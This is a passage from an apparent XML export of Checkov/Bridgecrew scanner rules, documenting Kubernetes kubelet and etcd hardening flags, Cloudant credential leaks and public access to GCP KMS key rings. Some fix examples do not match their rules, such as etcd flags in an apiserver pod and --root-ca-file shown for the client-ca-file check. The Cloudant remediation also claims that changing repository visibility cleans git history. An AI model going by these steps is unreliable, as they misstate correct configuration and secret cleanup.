<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - etcd
+   - --peer-cert-file=file.pem
+   - --peer-key-file=file.key
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-peer-cert-file-and-peer-key-file-arguments-are-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-peer-cert-file-and-peer-key-file-arguments-are-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-peer-cert-file-and-peer-key-file-arguments-are-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_121</key>
    <name>Ensure the --peer-client-cert-auth argument is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---peer-client-cert-auth-argument-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-peer-client-cert-auth-argument-is-not-set-to-true"></div>The --peer-client-cert-auth argument is not set to True</div><a aria-label="Skip link to The --peer-client-cert-auth argument is not set to True" class="heading-anchor-icon fa fa-anchor" href="#the---peer-client-cert-auth-argument-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>etcd should be configured for peer authentication. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be accessible only by authenticated etcd peers in the etcd cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">apiVersion: v1
kind: Pod
metadata:
  name: etcd
  namespace: should-pass
spec:
  hostNetwork: true
  containers:
      - name: "kuku2"
        image: "b.gcr.io/kuar/etcd:2.2.0"
        args:
          ...
+         - "--peer-client-cert-auth=true"
        ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-peer-client-cert-auth-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-peer-client-cert-auth-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-peer-client-cert-auth-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_138</key>
    <name>Ensure the --anonymous-auth argument is set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---anonymous-auth-argument-is-not-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-anonymous-auth-argument-is-not-set-to-false"></div>The --anonymous-auth argument is not set to False</div><a aria-label="Skip link to The --anonymous-auth argument is not set to False" class="heading-anchor-icon fa fa-anchor" href="#the---anonymous-auth-argument-is-not-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable anonymous requests to the Kubelet server. When enabled, requests that are not rejected by other configured authentication methods are treated as anonymous requests. These requests are then served by the Kubelet server. You should rely on authentication to authorize access and disallow anonymous requests.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+    - kubelet
+    - --anonymous-auth=false
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_139</key>
    <name>Ensure the --authorization-mode argument is not set to AlwaysAllow</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---authorization-mode-argument-is-set-to-alwaysallow"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-authorization-mode-argument-is-set-to-always-allow"></div>The --authorization-mode argument is set to AlwaysAllow</div><a aria-label="Skip link to The --authorization-mode argument is set to AlwaysAllow" class="heading-anchor-icon fa fa-anchor" href="#the---authorization-mode-argument-is-set-to-alwaysallow"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not allow all requests. Enable explicit authorization. Kubelets, by default, allow all authenticated requests (even anonymous ones) without needing explicit authorization checks from the apiserver. You should restrict this behavior and only allow explicitly authorized requests.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --authorization-mode=RBAC,node
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_5</key>
    <name>Cloudant Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudant-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloudant-credentials"></div>Cloudant Credentials</div><a aria-label="Skip link to Cloudant Credentials" class="heading-anchor-icon fa fa-anchor" href="#cloudant-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloudant is a document-oriented and distributed database running on IBM Cloud. The service can be accessed via API calls. An optional authentication method requires a username and password. An alternate authentication method consists of a username and the corresponding apikey.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
The secret can be revoked from the IBM Cloudant dashboard in the Service credentials tab.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect LogDNA logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_5' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_140</key>
    <name>Ensure the --client-ca-file argument for API Servers is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---client-ca-file-argument-for-api-servers-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-client-ca-file-argument-for-api-servers-is-not-set-appropriately"></div>The --client-ca-file argument for API Servers is not set appropriately </div><a aria-label="Skip link to The --client-ca-file argument for API Servers is not set appropriately " class="heading-anchor-icon fa fa-anchor" href="#the---client-ca-file-argument-for-api-servers-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Kubelet authentication using certificates. The connections from the apiserver to the kubelet are used for fetching logs for pods, attaching (through kubectl) to running pods, and using the kubelet&#8217;s port-forwarding functionality. These connections terminate at the kubelet&#8217;s HTTPS endpoint. By default, the apiserver does not verify the kubelet&#8217;s serving certificate, which makes the connection subject to man-in-the-middle attacks, and unsafe to run over untrusted and/or public networks. Enabling Kubelet certificate authentication ensures that the apiserver could authenticate the Kubelet before submitting any requests.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --root-ca-file=test.pem
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-client-ca-file-argument-is-set-as-appropriate-scored' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-client-ca-file-argument-is-set-as-appropriate-scored</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-client-ca-file-argument-is-set-as-appropriate-scored' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_8</key>
    <name>Ensure GCP Cloud KMS Key Rings are not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-cloud-kms-key-rings-are-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-cloud-kms-key-rings-are-anonymously-or-publicly-accessible"></div>GCP Cloud KMS Key Rings are anonymously or publicly accessible</div><a aria-label="Skip link to GCP Cloud KMS Key Rings are anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#gcp-cloud-kms-key-rings-are-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>GCP Cloud KMS key rings contain your encryption keys, and allowing anonymous or public access to a key ring grants permissions for anyone to access the cryptokeys stored inside the ring. CryptoKeys should only be accessed by trusted parties because they are commonly used to protect sensitive data.<br/>
&#8203;<br/>
We recommend you ensure anonymous and public access to KMS key rings is not allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/security/kms/keyrings" target="_self">Key Management</a>.</li>
<li>On the <strong>Key Rings</strong> details page, select your <em>key ring</em>.</li>
<li>Click the <strong>SHOW INFO PANEL</strong> side bar.</li>
<li>To remove a specific role assignment, to the front of <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, click <strong>Delete</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove access to <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud kms keyrings remove-iam-policy-binding KEY-RING \
    --location LOCATION \
    --member PRINCIPAL \
    --role roles/ROLE-NAME
</code></pre>
<p>Replace <strong>KEY-RING</strong> with the name of the key ring. Replace <strong>LOCATION</strong> with the location of the key ring. Replace <strong>PRINCIPAL</strong> with either <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong>. Replace <strong>ROLE-NAME</strong> with the name of the role to remove.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_kms_key_ring_iam_member</li>
<li><strong>Field</strong>: member<br/>
&#8203;</li>
<li><strong>Resource</strong>: google_kms_key_ring_iam_binding</li>
<li><strong>Field</strong>: members</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">//Option 1
resource "google_kms_key_ring_iam_member" "member" {
  key_ring_id = google_kms_key_ring.default.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
-  member        = "allUsers"
-  member        = "allAuthenticatedUsers"
}
&#8203;
//Option 2
resource "google_kms_key_ring_iam_binding" "binding" {
  key_ring_id = google_kms_key_ring.default.id
  role          = "roles/cloudkms.cryptoKeyEncrypter"
  members = [
-    "allUsers",
-    "allAuthenticatedUsers"
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-kms-key-rings-is-not-publicly-accessible-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-cloud-kms-key-rings-is-not-publicly-accessible-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-kms-key-rings-is-not-publicly-accessible-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_141</key>
    <name>Ensure the --read-only-port argument is set to 0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---read-only-port-argument-is-not-set-to-0"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-read-only-port-argument-is-not-set-to-0"></div>The --read-only-port argument is not set to 0</div><a aria-label="Skip link to The --read-only-port argument is not set to 0" class="heading-anchor-icon fa fa-anchor" href="#the---read-only-port-argument-is-not-set-to-0"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable the read-only port. The Kubelet process provides a read-only API in addition to the main Kubelet API. Unauthenticated access is provided to this read-only API which could possibly retrieve potentially sensitive information about the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --read-only-port=0
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-read-only-port-argument-is-set-to-0' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-read-only-port-argument-is-set-to-0</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-read-only-port-argument-is-set-to-0' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_143</key>
    <name>Ensure the --streaming-connection-idle-timeout argument is not set to 0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---streaming-connection-idle-timeout-argument-is-set-to-0"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-streaming-connection-idle-timeout-argument-is-set-to-0"></div>The --streaming-connection-idle-timeout argument is set to 0  </div><a aria-label="Skip link to The --streaming-connection-idle-timeout argument is set to 0  " class="heading-anchor-icon fa fa-anchor" href="#the---streaming-connection-idle-timeout-argument-is-set-to-0"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not disable timeouts on streaming connections.<br/>
Setting idle timeouts ensures that you are protected against Denial-of-Service attacks, inactive connections and running out of ephemeral ports.<br/>
By default, --streaming-connection-idle-timeout is set to 4 hours which might be too high for your environment. Setting this as appropriate would addition<br/>
ally ensure that such streaming connections are timed out after serving legitimate use cases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --streaming-connection-idle-timeout=1
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-streaming-connection-idle-timeout-argument-is-not-set-to-0' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-streaming-connection-idle-timeout-argument-is-not-set-to-0</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-streaming-connection-idle-timeout-argument-is-not-set-to-0' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_144</key>
    <name>Ensure the --protect-kernel-defaults argument is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---protect-kernel-defaults-argument-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-protect-kernel-defaults-argument-is-not-set-to-true"></div>The --protect-kernel-defaults argument is not set to True </div><a aria-label="Skip link to The --protect-kernel-defaults argument is not set to True " class="heading-anchor-icon fa fa-anchor" href="#the---protect-kernel-defaults-argument-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Protect tuned kernel parameters from overriding kubelet default kernel parameter values.<br/>
Kernel parameters are usually tuned and hardened by the system administrators before putting the systems into production. These parameters protect the kernel and the system. Your kubelet kernel defaults that rely on such parameters should be appropriately set to match the desired secured system state. Ignoring this could potentially lead to running pods with undesired kernel behavior.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --protect-kernel-defaults=true
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-protect-kernel-defaults-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-protect-kernel-defaults-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-protect-kernel-defaults-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_145</key>
    <name>Ensure the --make-iptables-util-chains argument is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---make-iptables-util-chains-argument-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-make-iptables-util-chains-argument-is-not-set-to-true"></div>The --make-iptables-util-chains argument is not set to True</div><a aria-label="Skip link to The --make-iptables-util-chains argument is not set to True" class="heading-anchor-icon fa fa-anchor" href="#the---make-iptables-util-chains-argument-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
